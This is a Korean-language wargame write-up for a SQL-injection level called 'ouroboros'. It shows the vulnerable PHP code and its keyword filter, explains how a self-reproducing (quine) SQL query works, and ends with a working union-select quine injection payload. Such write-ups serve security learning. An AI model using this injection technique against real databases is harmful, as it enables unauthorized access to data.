# ouroboros

## 1. Code
```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|rollup|join|@/i', $_GET['pw'])) exit("No Hack ~_~");
  $query = "select pw from prob_ouroboros where pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['pw']) echo "<h2>Pw : {$result[pw]}</h2>";
  if(($result['pw']) && ($result['pw'] === $_GET['pw'])) solve("ouroboros");
  highlight_file(__FILE__);
?>
```

## 2. Condition
- `prob _ . rollup join @` 등을 필터링 한다.   
- GET 파라미터 `pw`를 통해 입력을 받고, 쿼리를 실행시킨다.   
- GET 파라미터 `pw`와 쿼리 실행 결과, `$result['pw']`를 비교하여 동일시 문제가 해결된다.   


## 3. Solution
보기엔 간단하지만, 상당히 난이도가 있었던 문제다.   

처음 문제를 접했을 때는 blind-sqli 문제인가? 했지만,   
자세히 보니 새로운 쿼리 없이 하나의 쿼리로 get과 결과를 비교한다.   
&rarr; `quine`과 관련있는 문제임을 직감했다.(문제이름도 ouroboros:꼬리를 삼키는 자)   

`quine`이란, 자기자신의 소스코드를 그대로 출력해 주는 프로그램이다.   
쉽게 말해, 소스코드가 `print(~~)`인 quine를 실행시키면 출력값으로 `print(~~)`가 그대로 나오는 프로그램이다.    


기존에 있는 quine query를 사용할 것인데, 그전에 해당 쿼리를 분석해봤다.    
우선, 쿼리는 다음과 같다.   
```sql
select replace(replace('select replace(replace("$",char(34),char(39)),char(36),"$")',char(34),char(39)),char(36),'select replace(replace("$",char(34),char(39)),char(36),"$")');
```

머릿속 만으로 이해하기 상당히 버겁다.   
차근차근 뜯어보며 살펴보자.   

우선, 큰 부분으로 분리시켜보면 다음과 같이 나온다.   
>    select replace(replace(</span><span style="color:blue">'select replace(replace("$",char(34),char(39)),char(36),"$")'</span>,char(34),char(39)),char(36),</span><span style="color:blue">'select replace(replace("$",char(34),char(39)),char(36),"$")'</span>);   

다시, 파란색 긴 문자열을 A로 치환하여 살펴보자.   
>    select replace(replace(</span><span style="color:blue">A</span>,char(34),char(39)),char(36),</span><span style="color:blue">A</span>);   

아스키코드 34,39,36에 해당하는 문자는 `" ' $`이다.   
우리가 치환한 문자열 A는 우리가 입력한 쿼리 그 자체의 한 부분이다.   
>    'select replace(replace("$",char(34),char(39)),char(36),"$")'   
>
>    여기에서 "는 '로, $에 동일한 문자열이 각각 들어가주면 우리가 입력한 쿼리와 완벽하게 일치하게 된다.   
    또한 해당 치환하는 과정은 replace 함수를 통해 이루어 진다.   


실제로 해당 쿼리를 실행시켜보면, 쿼리값과 동일한 결과가 나옴을 알 수 있다.   
```sql
mysql> select replace(replace('select replace(replace("$",char(34),char(39)),char(36),"$")',char(34),char(39)),char(36),'select replace(replace("$",char(34),char(39)),char(36),"$")') as quine;
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| quine                                                                                                                                                                           |
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| select replace(replace('select replace(replace("$",char(34),char(39)),char(36),"$")',char(34),char(39)),char(36),'select replace(replace("$",char(34),char(39)),char(36),"$")') |
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.00 sec)
```   


이제 본격적으로 해당 쿼리를 문제에 적용시켜보자.   
```sql
' union select replace(replace('" union select replace(replace("$",char(34),char(39)),char(36),"$")%23',char(34),char(39)),char(36),'" union select replace(replace("$",char(34),char(39)),char(36),"$")%23')%23
```   

코드는 다음과 같다. 본래 쿼리를 이해한다면 쉽게 바꿀 수 있는 부분이다.   

해당 쿼리를 입력하면 문제가 해결되게 된다.